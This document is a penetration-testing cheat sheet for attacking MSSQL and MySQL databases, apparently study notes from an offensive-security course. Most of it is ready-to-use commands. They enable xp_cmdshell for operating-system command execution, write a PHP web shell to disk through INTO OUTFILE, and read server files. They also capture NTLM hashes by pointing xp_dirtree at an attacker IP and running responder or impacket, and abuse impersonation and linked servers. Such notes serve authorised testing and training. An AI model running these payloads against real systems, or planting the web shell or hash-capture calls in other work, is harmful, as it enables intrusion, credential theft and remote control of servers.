# SQL Databases

## 1. SQL Database Basics

* Store and manage structured data.
* Common attack vectors: misconfigurations, weak authentication, privilege escalation, and exploitation of DB-specific features.

## 2. Enumeration

### Ports

* MSSQL: 1433 (TCP), 1434 (UDP), 2433 (TCP)
* MySQL: 3306 (TCP)

### Nmap

```bash
nmap -Pn -sV -sC -p1433 <target_IP>
```

## 3. Authentication and Misconfigurations

* **MSSQL:** Windows authentication or SQL authentication (mixed mode).
* **MySQL:** Username/password or authentication plugins.
* Misconfigurations include weak passwords, excessive privileges, and writable file paths.

## 4. Protocol-Specific Attacks

### Connecting to SQL Servers

```bash
mysql -u <user> -p<password> -h <host>
sqlcmd -S <server> -U <user> -P <password>
sqsh -S <server> -U <user> -P <password>
mssqlclient.py -p 1433 <user>@<host>
```

### Basic SQL Queries

```sql
SHOW DATABASES;
SHOW TABLES;
SELECT * FROM <table>;

SELECT name FROM master.dbo.sysdatabases; GO
SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES; GO
```

### Command Execution (MSSQL)

```sql
xp_cmdshell 'command'; GO
```

Enable xp_cmdshell:

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; GO
```

### File Write (MySQL)

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/path/webshell.php';
```

### File Read

```sql
SELECT LOAD_FILE('/path/file');                          -- MySQL
SELECT * FROM OPENROWSET(BULK N'file_path', SINGLE_CLOB) AS Contents; GO   -- MSSQL
```

### Capture MSSQL Service Hash

```sql
EXEC master..xp_dirtree '\\<attacker_IP>\share\'; GO
```

### Impersonation (MSSQL)

```sql
SELECT distinct b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'; GO

EXECUTE AS LOGIN = '<user>'; GO
REVERT; GO
```

### Linked Servers (MSSQL)

```sql
SELECT srvname, isremote FROM sysservers; GO
EXECUTE('query') AT [<linked_server>]; GO
```

## 5. Recent SQL Vulnerabilities

* NTLMv2 hash capture via `xp_dirtree` triggering SMB authentication.

## Key Commands Summary

### Nmap

```bash
nmap -Pn -sV -sC -p1433 <target_IP>
```

### MySQL

```bash
mysql -u <user> -p<password> -h <host>
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT LOAD_FILE('/path/file');
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/path/webshell.php';
```

### MSSQL

```bash
sqlcmd -S <server> -U <user> -P <password>
mssqlclient.py <user>@<host>
SELECT name FROM master.dbo.sysdatabases; GO
SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES; GO
xp_cmdshell 'command'; GO
EXEC master..xp_dirtree '\\<attacker_IP>\share\'; GO
EXECUTE AS LOGIN = '<user>'; GO
REVERT; GO
EXECUTE('query') AT [<linked_server>]; GO
```

### Hash Capture

```bash
responder -I <interface>
impacket-smbserver share ./ -smb2support
```
